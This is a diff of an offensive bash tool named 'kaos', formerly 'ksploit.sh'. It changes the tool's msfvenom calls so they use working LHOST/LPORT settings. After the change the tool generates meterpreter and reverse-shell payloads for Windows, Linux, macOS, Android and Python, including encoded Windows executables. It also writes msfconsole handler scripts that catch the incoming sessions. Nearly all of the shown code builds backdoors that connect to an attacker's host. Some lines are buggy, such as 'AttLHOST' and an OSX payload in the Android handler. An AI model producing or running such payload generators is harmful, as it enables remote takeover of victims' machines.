@@ -1,5 +1,5 @@
 #!/bin/bash
-# Script: ksploit.sh v 0.1
+# Script: kaos v 0.1
 # Author: kaotickj
 # Website: kdgwebsolutions.com
 
@@ -97,11 +97,6 @@ shells()
 	select opt in "${options[@]}"
 	do
 	    case $opt in
-		"Windows_x86")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p windows/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > shell.exe
-		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
-		    ;;
 		"Bash")
     		    touch shell.sh
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
@@ -205,30 +200,30 @@ payloads()
 	    case $opt in
 		"Windows_x86")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p windows/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > shell.exe
+		    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > shell.exe
 		    echo "Generating payload ....."	
 		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
 		    ;;
 		"Windows_x64")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p windows/x64/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -f exe > shell.exe
+		    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > shell.exe
 		    echo "Generating payload ....."	
 		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
 		    ;;
 		"Linux")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x86/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -f elf > shell.elf
+		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shell.elf
 		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
 		    ;;
 		"Mac")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p osx/x86/shell_reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -f macho > shell.macho
+		    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > shell.macho
 		    echo "Generating payload ....."	
 		    echo -e "${DG} - - - -> shell.macho saved ${GREEN}"
 		    ;;
 		"Android")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p android/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport R > ~/Desktop/tmp/shell.apk
+		    msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > ~/Desktop/tmp/shell.apk
 		    echo "Generating payload ....."	
 		    echo -e "${DG} - - - -> shell.apk saved ${GREEN}"
 		    ;;  
@@ -237,23 +232,23 @@ payloads()
 		    echo "${DG} - - - -> set payload cmd/unix/reverse_python"
 		    echo ${GREEN}
 		    read -p 'Enter Attack box IP* ' attackerip
-		    echo "${DG} - - - -> set Attacker IP="$attackerip
+		    echo "${DG} - - - -> set LHOST="$attackerip
 		    echo ${GREEN}
 		    read -p 'Enter Attack box Port* ' attackerport
-		    echo "Generating payload ....."	
-		    echo "${DG} - - - -> set Attacker Port="$attackerport
+		    echo "${DG} - - - -> set LPORT="$attackerport
 		    echo ${GREEN}
-		    msfvenom -p cmd/unix/reverse_python Attacker IP=$attackerip Attacker Port=$attackerport -f raw > shell.py
+		    echo "Generating payload ....."	
+		    msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > shell.py
 		    echo -e "${DG} - - - -> shell.py saved ${GREEN}"
 		    ;;
 		"Meterpreter_x86")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x86/meterpreter/reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -f elf > shellx86.elf
+		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx86.elf
 		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
 		    ;;
 		"Meterpreter_x64")
 		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x64/shell_reverse_tcp Attacker IP=$attackerip Attacker Port=$attackerport -f elf > shellx64.elf
+		    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx64.elf
 		    echo "Generating payload ....."	
 		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
 		    ;;
@@ -294,9 +289,9 @@ do
             echo use exploit/multi/handler > meterpreter.rc
             echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
             read -p 'Set Attacker IP* ' attackerip
-            echo set Attacker IP $attackerip >> meterpreter.rc
+            echo set LHOST $attackerip >> meterpreter.rc
             read -p 'Set Attacker Port* ' attackerip
-            echo set Attacker Port $attackerip >> meterpreter.rc
+            echo set LPORT $attackerip >> meterpreter.rc
             echo set ExitOnSession false >> meterpreter.rc
             echo exploit -j -z >> meterpreter.rc
             cat meterpreter.rc | xterm -e msfconsole -r meterpreter.rc &
@@ -306,9 +301,9 @@ do
             echo use exploit/multi/handler > meterpreter_linux.rc
             echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> meterpreter_linux.rc
             read -p 'Set Attacker IP* ' attackerip
-            echo set Attacker IP $attackerip >> meterpreter_linux.rc
+            echo set LHOST $attackerip >> meterpreter_linux.rc
             read -p 'Set Attacker Port* ' attackerip
-            echo set Attacker Port $attackerip >> meterpreter_linux.rc
+            echo set LPORT $attackerip >> meterpreter_linux.rc
             echo set ExitOnSession false >> meterpreter_linux.rc
             echo exploit -j -z >> meterpreter_linux.rc
             cat meterpreter_linux.rc | xterm -e msfconsole -r meterpreter_linux.rc &
@@ -319,9 +314,9 @@ do
             echo use exploit/multi/handler > meterpreter_mac.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_mac.rc
             read -p 'Set Attacker IP* ' attackerip
-            echo set Attacker IP $attackerip >> meterpreter_mac.rc
+            echo set LHOST $attackerip >> meterpreter_mac.rc
             read -p 'Set Attacker Port* ' attackerip
-            echo set Attacker Port $attackerip >> meterpreter_mac.rc
+            echo set LPORT $attackerip >> meterpreter_mac.rc
             echo set ExitOnSession false >> meterpreter_mac.rc
             echo exploit -j -z >> meterpreter_mac.rc
             cat meterpreter_mac.rc | xterm -e msfconsole -r meterpreter_mac.rc &
@@ -331,9 +326,9 @@ do
             echo use exploit/multi/handler > meterpreter_droid.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_droid.rc
             read -p 'Set Attacker IP* ' attackerip
-            echo set Attacker IP $attackerip >> meterpreter_droid.rc
+            echo set AttLHOST $attackerip >> meterpreter_droid.rc
             read -p 'Set Attacker Port* ' attackerip
-            echo set Attacker Port $attackerip >> meterpreter_droid.rc
+            echo set LPORT $attackerip >> meterpreter_droid.rc
             echo set ExitOnSession false >> meterpreter_droid.rc
             echo exploit -j -z >> meterpreter_droid.rc
             cat meterpreter_droid.rc | xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
@@ -392,3 +387,4 @@ do
     esac
 done
 tput sgr0 
+
